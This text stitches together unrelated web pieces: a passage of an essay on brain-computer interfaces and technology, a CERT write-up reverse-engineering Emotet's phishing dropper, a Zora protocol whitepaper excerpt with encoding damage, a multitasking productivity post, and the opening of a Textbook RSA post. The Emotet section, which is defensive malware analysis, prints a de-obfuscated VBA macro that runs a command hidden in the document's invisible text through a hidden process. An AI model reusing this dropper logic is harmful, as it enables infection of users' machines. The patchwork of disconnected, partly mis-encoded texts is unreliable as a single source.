awe-inspiring.</p><figure><img src="https://www.murilopereira.com/neuralink.jpg" alt="Figure 3: Neuralink"><figcaption><p>Figure 3: <a href="https://neuralink.com/">Neuralink</a></p></figcaption></figure><p>Brain-computer interfaces present a monumental scientific and engineering
challenge, and brain-to-brain, a whole other category of difficulty.</p><p>First, we have no idea how information is encoded in the brain. That needs
to be understood. Second, even assuming we’re able to take a perfect
snapshot of a piece of information in someone’s brain—for example, how a
particular movie scene makes them feel—we still need to be able to encode
it in a way that includes the full context of their subjective experiences.
Maybe the scene evokes unique memories of their childhood or is somehow
entangled with the smell of a particular cinema’s leather seats. Third, we
need to figure out how to safely write this perfect snapshot into someone
else’s brain in a way that can be perceived identically.</p><p>Which is to say, it’s a difficult problem. But a worthwhile one: imagine
having the capability to suddenly become aware of answers for questions you
just thought about. To expertly control <a href="https://youtu.be/PLk8Pm%5FXBJE?t=13">truly integrated</a> prosthetics giving
you superhuman abilities. To give movement to the paralized, sound to the
deaf, and sight to the blind.</p><p>What would be the impacts on society if we were able to communicate an
order of magnitude more effectively? What if <em>everyone</em> was equipped with
the same undisputed basic knowledge of history and science?</p><p>There are internal thoughts that we can attempt to describe with a thousand
words, but ultimately fail to capture in a way that’s precise, much less
comprehensible by someone else. Words and sentences are an incomplete
representation of our internal thoughts. In the same way that 3D objects
cast 2D shadows (<a href="https://www.youtube.com/watch?v=N0WjV6MmCyM">and 4D, 3D</a>) communicating through language doesn’t carry
all of our cultural and developmental context—transmitting all of that
along with every phrase would be impractical. Language is in this sense,
lossily compressed thought.</p><figure><img src="https://www.murilopereira.com/tesseract_shadow.jpg"></figure><p>Inert strings of words of ink and paper take a life of their own inside our
heads. It’s why the exact same information can be interpreted completely
differently by different people.</p><p>Before language, fire and cooking technology allowed us to reallocate
energy usage from the digestive system to the brain by outsourcing
digestion to outside of our bodies, making macronutrients more efficiently
absorbable. Almost all of a cooked meal is metabolized by the body, whereas
raw foods yield less than half of their nutrients.</p><p>Cooking is an extension of our digestive system, and enabled us to develop
large, calorie-hungry brains. It also gave us time to think: our primate
cousins spend half of their days chewing raw food to consume enough
calories to stay alive.</p><p>Brains can be seen as <em>survival machines</em>, locked inside dark skulls,
constantly building a model of the outside world by predicting and learning
through senses and memory. The biological human brain evolved to have the
necessary sophistication to not only expertly navigate and understand the
brute physical reality but also to construct <em>social</em> reality. Democracy,
religion, money: all made up by us, for us.</p><p>We remember the past so that we can predict the future, and by doing so, we
thrive.</p><p>We create technology, which functions as a non-biological extra layer to
our brains and bodies, augmenting, complementing, and sometimes replacing
our natural capabilities.</p><blockquote><p>The wheel… is an extension of the foot.</p><p>The book… is an extension of the eye…</p><p>Clothing, an extension of the skin…</p><p>Electric circuitry, an extension of the central nervous system.</p><p>—
<a href="https://en.wikipedia.org/wiki/Understanding_Media">Understanding Media: The Extensions of Man (1964)</a></p></blockquote><p>Relatively speaking, we are done evolving <em>biologically</em>. Further adaptations
and enhancements to our bodies and minds will come through technology.</p><figure><img src="https://www.murilopereira.com/brain_layers.jpg" alt="Figure 5: Check out &amp;ldquo;Neuralink and the Brain&amp;rsquo;s Magical Future&amp;rdquo; for a very entertaining primer on the brain."><figcaption><p>Figure 5: Check out “<a href="https://waitbutwhy.com/2017/04/neuralink.html">Neuralink and the Brain’s Magical Future</a>” for a very entertaining primer on the brain.</p></figcaption></figure><p>To be human is to have the ability to change the world around us. The shift
from hunting and gathering to farming allowed us to spend less energy to
acquire food while giving us a predictable calorie supply.</p><p>The resulting food surplus made it possible for populations to settle down
and grow quickly while supporting people not being directly involved in the
production of food—before agriculture that was everyone’s job. For one,
it allowed some to specialize and focus on developing better farming tools
and more resistant crops, starting a vicious cycle of improvement and
consumption that continues until today.</p><p>The transition from active foraging to a more sedentary lifestyle resulted
in worse health for the general population. The average farmer worked
harder than the average forager and got a worse diet in return. Our teeth,
bones and joints became more fragile, and we became afflicted by novel
diseases coming from newly domesticated animals, carriers of pathogens that
incubated in our new densely populated cities.</p><p>Owning land suddenly became really important. Agriculture and the concept
of private property reinforced each other and grew together, allowing us to
create value and secure the fruits of our labor. It also created the
circumstances for slavery to arise, and wars to be waged.</p><p>The groups of people growing the first crops could not have anticipated all
of the collateral effects of their breakthrough. They just wanted more
food.</p><p>If the past has taught us anything is that we have to be mindful of the
consequences of our progress. In an increasingly connected world, change is
often <a href="https://hbr.org/2017/05/linear-thinking-in-a-nonlinear-world">nonlinear</a> and unpredictable. Cars didn’t just replace horses—they
forever changed the entire outlook of every city. Did Tim Berners-Lee
anticipate his invention adding to forces pulling whole countries apart?</p><p>Our progress will continue to bring us previously unimaginable challenges.
Against an unknowable future, it doesn’t hurt to keep improving our
capabilities to adapt and, more difficultly, to cooperate—especially at
scale.</p><figure><img src="https://www.murilopereira.com/humanity.jpg" alt="Figure 6: &amp;ldquo;Humanity&amp;rdquo; by Pawel Kuczynski"><figcaption><p>Figure 6: “<a href="https://www.pictorem.com/24592/humanity.html">Humanity</a>” by Pawel Kuczynski</p></figcaption></figure><p>Computers are getting pretty good at driving cars—even in the most

<h2><span id="Preamble"></span>Preamble<span></span></h2>



<p>In October 2020 we observed an outbreak of malicious e-mails reaching GRNET employees’ inboxes. Meanwhile, similar campaigns were also targeting several public and private sector organizations in Greece. After acquiring dozens of such e-mails, we started planning our defensive strategy. To do so, we started analyzing the malware that was attached to the emails and realized that were dealing with the infamous Emotet trojan.</p>



<p>In this document, we describe the steps of our analysis including the reverse engineering process of the malware executables, how we overcame the binary obfuscation techniques it employed, and how we determined the malware’s internals. In the course of our work, we were able to discover the list of IP addresses that&nbsp;constituted the network of Command-and-Control (C2) servers of Emotet. This information was very useful because we utilized it to detect any network connections from the GRNET network to the Emotet C2 network. Such connections&nbsp; would indicate a potential compromised workstation in our premises. Overall, the goals of our analysis were to (a) create an infrastructure that received new updates of the Emotet trojan and keep our list of C2 IP addresses up-to-date and (b) understand the trojan’s persistence mechanism to perform forensic invastigations on compromised workstations.</p>



<p>On January 27, 2021 <a rel="noreferrer noopener" href="https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action" target="_blank">Europol announced</a> that it had completely taken down Emotet. The same day our update-monitoring infrastructure received an update which was Europol’s clean-up payload scheduled to be executed on April 25, 2021 at 12:00 p.m.. Hopefully, this will be the last time that we hear about Emotet. Meanwhile, we had been working on analyzing Emotet up to the time of Europol’s announcement. We release our analysis results hoping that IT professionals will find them useful when trying to protect against similar trojans in the future.</p>



<p>In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_1_From_the_e-mails_to_the_binaries" data-type="post">Chapter 1</a> we describe the malicious e-mails and the malware dropper (a macro-enabled MS Word document) delivered via those e-mails.&nbsp;If you are already familiar with Emotet’s dropper you may directly skip to the next chapters. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_2_From_the_Protector_to_the_Trojan">Chapter 2</a> we analyze the malware’s multi-layer Protector responsible for unpacking, decrypting and running the trojan for the first time. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_3_Overcoming_the_malware_obfuscation_techniques">Chapter 3</a> we describe the binary obfuscation techniques incorporated in the trojan itself as well as the ways to bypass them. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_4_The_trojans_internals">Chapter 4</a> we provide an in-depth description of the trojan’s inner-workings, its persistence mechanism, the communication with the Command-and-Control servers network and the way we discovered the C2 network. Finally, in <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_5_Monitoring_the_updates">Chapter 5</a> we briefly describe the process we followed to retrieve and analyze new payloads served by the C2 network.</p>



<p>We have published the de-compiled code of referenced functions as well as the utilities that we implemented during the analysis in <a href="https://github.com/grnet/emotet-utils" target="_blank" rel="noreferrer noopener">a GitHub repository</a>.</p>



<p>This work was carried out under the&nbsp;supervision of GRNET’s Chief Information Security Officer, Dimitris Mitropoulos.</p>

<p>October 2020.</p>



<p>Seven months have passed since the first COVID-19 lockdown in Greece. The pandemic finds GRNET with a largely broadened IT Security agenda heavily linked with the state’s current digital transformation (involving several new applications being developed and maintained in house). The aforementioned developments, together with the work-from-home style that has just arrived, completely redefined the security perimeter and priorities of GRNET CERT. A new era comes with new challenges.</p>



<p>Somewhere in between the various ongoing tasks, a number of weird looking e-mails that reached GRNET employees came to our notice. They all had a similar form, i.e., replies to legitimate mails that either contain a URL or an encrypted ZIP attachment and its password.</p>



<h3><span id="The_e-mails"></span>The e-mails<span></span></h3>



<p>First, to raise awareness, we notified all GRNET employees. Then, we started collecting and analyzing the suspicious e-mails. Initially, we inspected their source code looking for similarities.</p>

E-mails delivering Emotet dropper via URL (left) and attachment (right)</figcaption></figure>



<p>Our analysis led to several interesting remarks:</p>



<ul><li>All e-mails were replies to legitimate e-mails. The e-mail subject followed a specific pattern, i.e., “Re: &lt;ORIGINAL MAIL SUBJECT&gt;”. Also, the e-mail body contained the quoted original e-mail body.</li><li>The sender’s display name was altered to be the same with that of the original e-mail.</li><li>However, the sender’s e-mail address was some unrelated e-mail address (several compromised e-mail accounts were used).</li><li>The body of the reply contained either a URL or an attachment.<ul><li>In the case of the URL, the text contained a legitimate domain name (e.g. gmail.com). Nevertheless, the actual target was completely different. Our investigation indicated that they were compromised websites used by the attackers to host the malicious documents.</li><li>In the case of the attachment we observed encrypted ZIP files with the corresponding password contained in the reply body. Note that password encrypted attachments are commonly used to bypass any malware detection running on e-mail servers.</li></ul></li><li>Finally, in all cases we ended up with MS Word documents.</li></ul>



<h3><span id="The_MS_Word_documents"></span>The MS Word documents<span></span></h3>



<p>Up to this point, we had already been informed about similar cases affecting other public and private sector organizations in Greece. Thus, a conventional incident response was not enough; we wanted to further analyze the malware.</p>



<p>Our analysis started with the Word documents. When opening one of the documents, the victim sees a fake pop-up window. In fact, this is just an image inside the document imitating a legitimate pop-up window. In each document the fake pop-up window phrasing was different, but in every case it was there to persuade the victim to enable the Macro execution.</p>

<p>We will continue by analyzing one of the MS Word documents. All other documents were similar to the one examined; albeit with minor differences.</p>



<h3><span id="The_VBScript_Macros"></span>The VBScript Macros<span></span></h3>



<p>To see what would happen when a user enabled the macros, we examined the corresponding VBScript. The entry-point <code>Document.Open()</code> called function <code>Q4hxwcihtett()</code> of module <code>Iauesnh6lzhaf</code>:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="395" height="163" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png 395w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1-300x124.png 300w" sizes="(max-width: 395px) 100vw, 395px"></a><figcaption>Figure 3. The VBScript macro entry-point </figcaption></figure></div>



<p>The function code, as we observe below, was obfuscated:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="735" height="413" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png 735w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1-300x169.png 300w" sizes="(max-width: 735px) 100vw, 735px"></a><figcaption>Figure 4. The main VBSript macro module</figcaption></figure></div>



<p>We started following the code flow manually to understand it. This manual process revealed that most of the code was indeed irrelevant. Specifically, for each meaningful code instruction, the obfuscation process had generated a bunch of meaningless instructions placed before the meaningful one. So, most of the de-obfuscation effort was to identify each block and isolate the meaningful code instruction out of the block.</p>



<p>Luckily enough, the attackers had left some traces that were helpful for us. As we noticed, their obfuscating tool had a serious issue (nobody’s perfect). In particular, it did not apply the indentation of the original instruction on the instructions of the replacement block. As a result, the original indentation could be found on the first instruction of each block. This&nbsp;issue gave us a way to automatically detect the blocks and isolate the last instruction of each block, which we knew it was the meaningful instruction of the block.</p>



<p>The following obfuscation techniques were identified:</p>



<ul><li>Deliberate run-time errors in junk instructions (which were ignored because of the <code>On Error Resume Next</code> statement),</li><li>String construction using one or more of the following:<ul><li>String concatenation,</li><li>Use of undefined variables that resolve to empty strings,</li><li>String replacements with the <code>Replace()</code> function,</li><li>Conversion of ASCII codes to strings with the <code>ChrW()</code> function,</li><li>Retrieval of values from hidden user form control elements,</li></ul></li><li>Alteration between upper and lower case letters in symbol names, exploiting the case insensitivity of Windows OS,</li><li>Use of the line-continuation character <code>_</code> to break statements in multiple lines.</li></ul>



<p>Then, we only had to manually de-obfuscate some lines of code (the original number of lines was a little more than 400). The result was the following:</p>



<pre><code>01: Rem Attribute VBA_ModuleType=VBADocumentModule
02: Option VBASupport 1
03: Private Sub Document_open()
04:   Set storyRange = ThisDocument.StoryRanges.Item(1)
05:   Set commandLine = Mid(storyRange, 5, Len(storyRange))
06:   commandLine = Replace(commandLine, "][ 1) jjkgS [] []w", Empty)
07:   Set objProcess = CreateObject("winmgmts:Win32_Process")
08:   Set objProcessStartup = CreateObject("winmgmts:Win32_ProcessStartup")
09:   objProcessStartup.ShowWindow = 0
10:   objProcess.Create commandLine, Empty, objProcessStartup
11: End Sub</code></pre>



<p>Hence, we were able to answer an important question: “What happens when the user executes this macro?”</p>



<p>Well, it spawns a process calling the <code>Win32_Process.Create()</code> method (line 10). The startup information parameter says “do not show a window” (line 9). Further, the command line parameter holds the command that will be invoked by the spawned process. As we can observe in the code, the command is already in the document (lines 4-5) together with some junk that is removed (line 6).</p>



<p>So there was something more in the document itself apart from the fake popup window.</p>



<h3><span id="The_PowerShell_script"></span>The PowerShell script<span></span></h3>



<p>First, we removed the formatting. In this way we revealed a paragraph that was kept out of the victim’s sight (it was formatted with a font size of 2px and a white font color):</p>

Obfuscated PowerShell command hidden in document body</figcaption></figure></div>



<p>This looked obfuscated, too. But we already know how to de-obfuscate it, i.e.  <code>Replace(commandLine, "][ 1) jjkgS [] []w", Empty)</code>:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Zora: Universal Media Protocol</h2><h3>Introduction</h3><p>Digital tooling and internet communication networks have given people the unprecedented ability to create and share media. But today, creators have unprecedented dependency on internet media platforms. Media is created on, uploaded to, hosted by, and shared within platforms. Platforms control creator identity and host their own social graph, restricting the ability of creators to connect with their audience. And by controlling data and graph, platforms have gained unilateral pricing power over creative media. Each platform has its own opaque methods of establishing the value of media, and creators must learn to play by these rules to make a sustainable business. This is the lesson of Web 2.0: when the process of sharing content with others is owned entirely by private platforms, the cost of this mediation falls heavily on creators.</p><p>To combat platform entrenchment, an ecosystem approach that addresses the publishing and sharing of media online is called for. Prospective solutions must seek to unbundle the platform monopoly over media data and social graph, enabling creators and audiences to engage and transact on digital media directly. Information wants to be free, but it also wants to be expensive. In an ideal ecosystem, audiences would enjoy the universal accessibility of media, and creators would enjoy more pricing power and stable returns on media which appreciates in value.</p><p>In this paper, we propose Zora Protocol, a universal market protocol for media ownership. Zora provides a cryptographically-enforced registry of media independent of any platform. Media is openly accessible to audiences, curators, and third parties who wish to build on the token. Artificial scarcity on media copies need not be imposed, because the single market embedded in the token enables liquidity and value to accrue to the uniquely registered article. An embedded, permanent market facilitates ongoing price discovery and enables creators, curators, and buyers to flexibly negotiate terms of direct exchange. Creators can set a perpetual ownership stake in their work, and are rewarded whenever ownership changes hands.</p><p>Each minute, creators generate unthinkable amounts of information and value. Today that value is priced, captured, and owned by digital media platforms. By enabling platformless media, Zora Protocol welcomes an age where that value returns where it belongs: creators and their communities.</p><p>Â&nbsp;<!-- -->

<img src="https://zora.engineering/diagrams/platformlessMedia.png" alt="Platformless Media">
<!-- -->Â&nbsp;<!-- -->
<!-- -->Â&nbsp;</p><h3>Zora Protocol Overview</h3><p>Zora is a protocol designed for the Ethereum blockchain that establishes universal, perpetual markets for media in the form of <a href="https://eips.ethereum.org/EIPS/eip-721">ERC-721</a>. Each piece of media is embedded with a market, consisting of a transparent pool of bids. As a result, a universal buy-side liquidity pool develops for the piece of media that an owner can access and act upon at any time. Each market is unique to the piece of media, and its bids can be inspected by anyone. In addition to bids, the media owner may choose to set an ask price for their media, which is a suggested bid that can be executed by a willing buyer. Whenever a bid is accepted, or an ask fulfilled, the piece of media is transferred to the buyer, and the funds from that bid are split amongst its shareholders. There can be up to three shareholders for a piece of media: the owner, the previous owner, and the original creator.</p><p>The Zora protocol introduces integrity checks to ensure that media and its metadata is provably unique. These integrity checks can be performed by any system at any time. This integrity safeguard allows for the URI of media and metadata to be updated arbitrarily, ensuring robustness when hosting media off-chain.</p><h3>Bids</h3><p>This protocol uses Bids to represent buy-side liquidity for a piece of media. An important distinction of a bid is that it specifies an <a href="https://eips.ethereum.org/EIPS/eip-20">ERC-20</a> currency to be bid with. This mechanism allows for a market of many currencies to exist for the media. As a result, an owner of a piece of media may choose to accept a bid in a stable currency, a yield-generating currency, or even a community currency that enables access to a DAO. By allowing any valid ERC-20 currency to be used as a bid, the protocol allows for many representations of value to exist in parallel.</p><p>In some situations, an individual selling some media may believe that the media will become very valuable in the future, but does not have the means to propagate the media enough to attract bidders. In this circumstance, the owner may choose to accept less capital upfront from a bidder in exchange for a large sell-on fee. A sell-on fee is most commonly used by sports clubs, but it has been adopted into this protocol. This clause can be included by the bidder, whereby the seller, against a lower immediate transfer fee, retains the right to a certain percentage of a potential future transfer fee of the media to a third buyer. If a bid with a sell-on fee is accepted, the piece of media adds the seller as a previous owner to the list of shareholders for the next sale of the piece.</p><p>When a bid is accepted, the value of the bid is transferred to the mediaâ€™s shareholders, and the ownership of the media itself is transferred to the accepted bidder. The split of the bid can be unique to each piece of media. For example, assume a creator mints a piece of media specifying the creator share to be 5%. Upon each sale, 5% of the bidâ€™s value is transferred to the owner, and 95% of the bidâ€™s value is transferred between the owner and previous owner, depending on any sell-on fee defined by the previous sale of the piece.</p><p>We define a bid in the protocol as a Solidity struct as follows:</p><pre><code>struct Bid {
    // Amount of the currency being bid
    uint256 amount;
    // Address to the ERC20 token being used to bid
    address currency;
    // Address of the bidder
    address bidder;
    // Address of the recipient
    address recipient;
    // % of the next sale to award the previous owner
    Decimal.D256 sellOnFee;
}
</code></pre><h3>Bid Validity</h3><p>When splitting a bid between shareholders, this protocol will not round or estimate the share amounts; it requires the bid amount be perfectly divisible into its shares. For example, suppose a piece of media is to have a bid split evenly to the creator, owner, and previous owner of the piece. If a bid were placed with an amount of 2, how would the bids be split? Note that floating point arithmetic does not exist in Solidity, so an approximation of 0.33 per shareholder is impossible.</p><p>Thus we must introduce the concept of a bid's validity. We define a bid to be valid if it can be split such that the shareholders amounts are not rounded off or estimated. Fortunately, we find that any bid is valid if it is divisible by the least common denominator of the shareholders when the shareholder percentages are represented as a set of ratios. To convert a shareholder percentage into a ratio, we simply represent it as a fraction with integer numerator and denominator. For example, the percentages 5%, 5.5%, and 5.55% would be represented as 5<!-- -->â�„<!-- -->100, 55<!-- -->â�„<!-- -->1000, and 555<!-- -->â�„<!-- -->10000, respectively.</p><p>In order to find the least common denominator for the set of shares, we represent the set of shares as fractions with a common integer denominator and multiply that denominator by the greatest common denominator of the numerators in the set. For example, suppose we have the following set of shares: 1.5%, 15%, 83.5%.</p><p>We represent the shares as fractions with a common denominator as follows:</p><p><img src="https://zora.engineering/diagrams/whitepaperMath1.png" alt="Share fraction calculation"></p><p>We can use this representation to find the least common denominator:</p><p><img src="https://zora.engineering/diagrams/whitepaperMath2.png" alt="Least common denominator calculation"></p><p>Therefore, given the least common denominator of 200, any valid bid must be divisible by 200. Note that at first read, this value may seem high, but recall that the majority of ERC-20 tokens in Ethereum have 18 decimals. Therefore, a bid for the above set of shares must be divisible by 5 <!-- -->*<!-- --> 10<sup>-15</sup> units, which we assume to be an acceptable amount for this protocol.</p><h3>Asks</h3><p>At any time, an owner of a piece of media may accept a valid bid. However, bids only represent the buy-side of a media market. Without a sell-side, liquidity will fragment into multiple different pools. This protocol therefore uses an ask mechanism that allows for bidders to automatically execute a trade if the ask is fulfilled.</p><p>Similar to a bid, the ask must specify a valid ERC-20 currency that is being asked for. An ask will only ever be fulfilled if a bid meets all of the criteria specified. When a bid is accepted or an ask fulfilled, the ask is removed. We represent an ask as the following struct in Solidity:</p><pre><code>struct Ask {
    // Amount of the currency being asked
    uint256 amount;
    // Address to the ERC20 token being asked
    address currency;
    // % of the next sale to award the seller

It is therefore paramount that no two pieces of media are identical, or else the value of the media risks fragmentation. We introduce a method to ensure the uniqueness of all content published to the protocol. In addition to ensuring uniqueness across all media, this also allows for any entity to validate the integrity of the media represented on-chain.</p><p>This protocol recognizes that storing any form of media on the Ethereum blockchain is prohibitively expensive and unnecessarily complicated. As a result, the protocol will make no assumptions about where media content and metadata should be stored. In compliance with the ERC-721 standard, the representation of media on the Zora protocol will simply be two URI pointers: one to the metadata, and one to the content itself. In some circumstances, such as a domain name change, the media URIs may no longer be valid and will need to be changed.</p><p>The protocol provides the current owner the ability to update the URIs for a piece of media. In order to ensure the integrity of the metadata and content, the protocol requires two sha256 checksums be included when minting new media. …</p></div></div>

                    <p>I know you don’t want to hear it. But multitasking isn’t effective. In this day and age of extreme busyness and “how much can we get done in a day” mentality, everyone is trying to do more — all at once. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"We claim to be multitasking, but in reality, we are just tackling several tasks in a far less effective way than we would if we simply focused on one at a time."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We seem to think that <em>doing more</em> gives us more value as human beings. That somehow the <em>doing</em> gives us meaning and purpose (as opposed to what is actually accomplished). And we have trouble distinguishing between what is truly important and what is not. Or perhaps the problem comes in making the <em>choice</em> of what is important — in other words: choosing the priority.</p><figure><img src="https://blog.doit.io/content/images/2020/06/MythOfMultitasking-1.jpg" alt="The myth of multitasking"><figcaption>The myth of multitasking</figcaption></figure><p>Notice I said <em>priority</em>, singular. In essence, the definition of the word <em>priority </em>means <em>something of highest importance that comes before other things</em>. When you truly think about it, it is impossible to have more than one. If you claim to have, for instance, ten priorities, then there is really no priority. They all become of equal importance and none of them is coming before the other. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"When we try to multitask, we are basically refusing to choose a priority in that moment."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We are forcing our brain to battle it out, and unfortunately, it is a losing battle.</p><h2 id="the-brain-s-reality">The Brain’s Reality</h2><p>So is it really totally impossible to multitask? After all, people claim to be doing it all the time. In fact, many of us pride ourselves on it. We look at younger generations — those growing up immersed in technology — as being experts in multitasking. </p><p>Well, it’s possible to do some simple tasks at the same time — like walking and talking. But when it comes to concentrated work, multitasking just isn’t scientifically possible. Instead, when we try to do two types of work at the same time that require our concentration, our brain switches back and forth from task to task. </p><p>Okay, so maybe we switch back and forth. But we’re still getting both things done right? Possibly. But the cost is often not worth it. Your brain is working much harder than it needs to. In fact, it’s overwhelmed with the constant switching of information. </p><h2 id="the-cost-of-the-switch">The Cost of the Switch</h2><p>Each time your brain switches from focus on one thing to focus on another, it takes time to recalibrate. Imagine it as refocusing a camera lens on two different subjects, back and forth. It takes a few seconds to change the focus each time, and those seconds add up. And when the tasks are really high-information tasks, like coding, for instance, it takes even longer to get back to full focus.</p><p>So you actually <strong>lose valuable time</strong> when you attempt to multitask. Not only that but your attention is divided. The switch puts you in an attention debt that takes a toll on your mental state. You are more likely to make mistakes and produce lower-quality work than <a href="https://blog.doit.io/focus-on-one-thing-leads-to-better-work/">if you were to simply do one thing at a time.</a> </p><h2 id="the-challenge-of-focus">The Challenge of Focus</h2><p>Despite the facts laid out in front of us, we continue to attempt multitasking. We churn out the work and check off the boxes like we are competing for a prize at the end of the day. And our lives are set up to encourage this. </p><p>Our smartphones are mini-computers that we carry with us everywhere. Sure, they are very convenient, but they are also constant distractions pulling at our attention. Many of us also compulsively check our email and text messages. The pace of communication today is such that we feel like we can’t afford not to. Some workplaces are set up in such a way that we are <em>expected</em> to respond immediately to any messages sent. Unfortunately, this takes a toll on our focus, too.</p><h2 id="narrowing-down-your-priorities">Narrowing Down Your Priorities</h2><p>Streamlining your priorities is a choice. And it may well be a tough one. But if you want to produce higher-quality work and reduce the stress on your brain, it’s worth it. Perhaps it’s too much to expect you to choose one single priority. But it starts with narrowing down your total priorities. And then simply choosing ONE priority for a specific chunk of time. One single thing to focus on.</p><p>So, take a step back and zoom out to the bigger picture of your life or your job. What is <em>truly</em> important to you or to your role? You may want to have a ranking system so you place areas of life or goals in order of importance. When you put some thought into it and make these choices “ahead of time,” it allows you to stay true to your priorities in the heat of the moment. When something comes up in your day and you have to choose what gets your full attention, you have already decided on your priorities.</p><h2 id="weed-out-the-multitasking">Weed Out the Multitasking</h2><p>Start eliminating the multitasking moments and improving your focus and work quality by choosing one time-slot per day where you will focus on one single task. Just start with one. Don’t make it too big — 30-45 minutes is enough to start. (Your brain needs breaks, too.) As you discover the value in doing this, you’ll likely want to add more chunks of focused time.</p><p>As you work on weeding out the multitasking, think of consolidating other things you do during a given day. Because another thing that weakens our focus is role-switching. So when we switch from making phone calls (which is one type of skill) to writing a brief (which is another skill) to filling out a form (which is another), it also tires our brains unnecessarily. Instead, look at how you can group similar types of tasks together. </p><p>This means email, too.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>"Instead of keeping your browser open all day and responding as they come in, give yourself set times to handle email."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>If that makes you nervous (<em>“What if I don’t respond to someone right away?!”</em>), then perhaps include in your email signature a line that says, “I check email at 10 a.m., 1 p.m., and 4 p.m.” This gives them an indication of when they can expect a response. Checking email constantly might be a tough habit to break, but remember it <em>is</em> a habit that we’ve built up. Don’t forget there was a time when there was no email and no smartphones. And everyone survived.</p><p>We have incorporated distractions into our lives, and they are disguised as a means to be “connected” and “more productive.” Be aware of what is truly helping you be productive and what is actually keeping you from the goals you really care about.</p><h2 id="systems-to-try">Systems to Try</h2><p>Choosing priorities and improving focus have been issues for many people for a very long time. So know you are not alone in the struggle. Luckily, those before you have also created systems and processes to help simplify things. </p><p>If you are in the market for a more structured approach to deciding on priorities and focusing, perhaps try David Allen’s <a href="https://blog.doit.io/getting-things-done-gtd-method/"><em>Getting Things Done</em></a> system to give you some fresh clarity. Or try the <a href="https://blog.doit.io/the-pomodoro-technique-boost-your-productivity/"><em>Pomodoro technique</em></a> to give you a framework for focused work. The <a href="https://blog.doit.io/the-ivy-lee-method/"><em>Ivy Lee Method</em></a> helps you to minimize your daily priorities, and the <a href="https://blog.doit.io/the-eisenhower-matrix/"><em>Eisenhower Matrix</em></a> helps you determine what is truly important vs. urgent.</p><p>There are many systems and processes to choose from, all with slightly different approaches for improving your productivity. None are right or wrong — it’s all about what will work for you. I suggest you choose one to try and give it a few weeks to see whether it helps you or not. Ultimately, the change will need to come from within you and your own desire to produce higher quality work with less stress. And remember that the way we work is habit, and we have the power to transform our habits for the better. But it doesn’t happen overnight. So matter how you choose to approach it, remember to give it time and stay committed.</p><h2 id="the-benefits-of-single-tasking-and-fewer-priorities">The Benefits of Single-Tasking and Fewer Priorities</h2><p>There is a state that is possible to reach <em>only</em> when your focus is pure and your attention is on a single task. That is the state of <strong>Flow</strong> (discussed in detail by Mihaly Csikszentmihalyi in his book of the same name). Creative thinking is at a maximum and you are completely <em>in the zone</em>. The quality of work is usually very high. And not only that, but the feeling you get when you are able to work in this state is truly wonderful. </p><p>Accomplishment. Pride. Fulfillment. </p><p>Fewer priorities means you can give your <strong>all</strong> to your goals. It means you waste less time and undoubtedly feel more energetic. It equals lower levels of stress and reduced anxiety. With the facts laid out before you, it seems ridiculous to keep attempting the false process which is multitasking! Give single-tasking a try and experience the wealth of benefits to your workflow and quality.</p><p><a href="https://blog.doit.io/what-is-productivity/">&lt;- Go back to The Productivity Guide</a><br></p>

<p><em>This blog post is dedicated to those to brave souls that dare to <a href="https://www.youtube.com/watch?v=UmovUkIBkT8">roll</a> their own <a href="https://makeameme.org/meme/crypto-means-cryptography">crypto</a>&nbsp;</em></p>



<h2>The RSA Textbook of Horrors</h2>



<p>This story begins with an old project of ours, where we were tasked to verify (among other things) how a business application handles digital signatures of transactions, to comply with four-eyes principles and other security rules.</p>



<p>The application used RSA signatures, and after a bit of head scratching about why our breakpoints on the usual OpenSSL API’s don’t trigger, but those placed at the depths of the library do, we realized that developers implemented what people in security like to call <a href="http://cs.wellesley.edu/~cs310/lectures/26_rsa_slides_handouts.pdf">“Textbook RSA”</a> in its truest sense. This of course led to red markings in the report and massive delays in development, but also presented us with some unusual problems to solve.</p>



<p>One of these problems stemmed from the fact that although we could present multiple theoretical attacks on the scheme, the public keys used in this application weren’t published anywhere, and without that we had no starting point for a practical attack.</p>



<div><figure><figure><img src="https://blog.silentsignal.eu/wp-content/uploads/2021/02/5cf7414dde4ef.png" width="250" alt=""></figure></figure></div>



<p>At this point it’s important to remember that although public key cryptosystems guarantee that the <em>private</em> key can’t be derived from the <em>public</em>&nbsp;key, signatures, ciphertexts, etc., there are usually no such guarantees for the <em>public</em> key! In fact, the good people at the Cryptography Stack Exchange <a href="https://crypto.stackexchange.com/a/30301/7826">presented</a> a really simple solution: just find the greatest common divisor (GCD) of the difference of all available message-signature pairs. Without going into the details of why this works (a more complete explanation is <a href="https://crypto.stackexchange.com/a/33644/7826">here</a>), there are a few things that worth noting:</p>



